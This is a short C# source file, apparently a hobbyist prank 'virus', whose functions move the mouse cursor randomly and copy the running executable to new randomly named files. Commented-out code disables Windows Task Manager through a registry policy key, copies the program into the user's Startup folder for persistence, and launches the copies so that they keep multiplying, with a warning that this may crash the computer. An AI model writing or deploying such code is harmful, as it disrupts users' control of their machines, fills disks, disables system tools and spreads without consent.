using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;
using System.Data;
using System.IO;
using Microsoft.Win32;

namespace Virus
{
    public static class Functions
    {
        
        public static Random number = new Random();
        public static void CrazyMouse()
        {
            
            Point mousePos=new Point();
            mousePos.X = number.Next(0,1780);
            mousePos.Y = number.Next(0,1000);
            Cursor.Position = mousePos;
            
        }
        /*
        public static void SetTaskManager(bool enable)
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
            else
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }
        */
        public static void Startup()
        {
            /*
            OperatingSystem os = Environment.OSVersion;
            if(true)//(os.Platform==PlatformID.Win32NT)&&(os.Version.Major>=7)
            {
                string path = "C:\\Users\\" + System.Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
                if(Directory.Exists(path))
                {
                    if(!File.Exists(path+"\\virusino.exe"))
                    {
                        File.Copy(System.Windows.Forms.Application.ExecutablePath, path + "\\virusino.exe");
                    }
                }
            }
            */
        }
        public static void Multiply()
        {
            int num = number.Next();
            File.Copy(System.Windows.Forms.Application.ExecutablePath, System.Windows.Forms.Application.ExecutablePath+num+".exe");
            /*
              Caution Advised!!! Uncommenting this might cause your computer to crash!!
              This will make the virus open it's copies and they will also start multiplying!
            File.Open("Virus" + num + ".exe",FileMode.Open);
            */
        }
    }
}
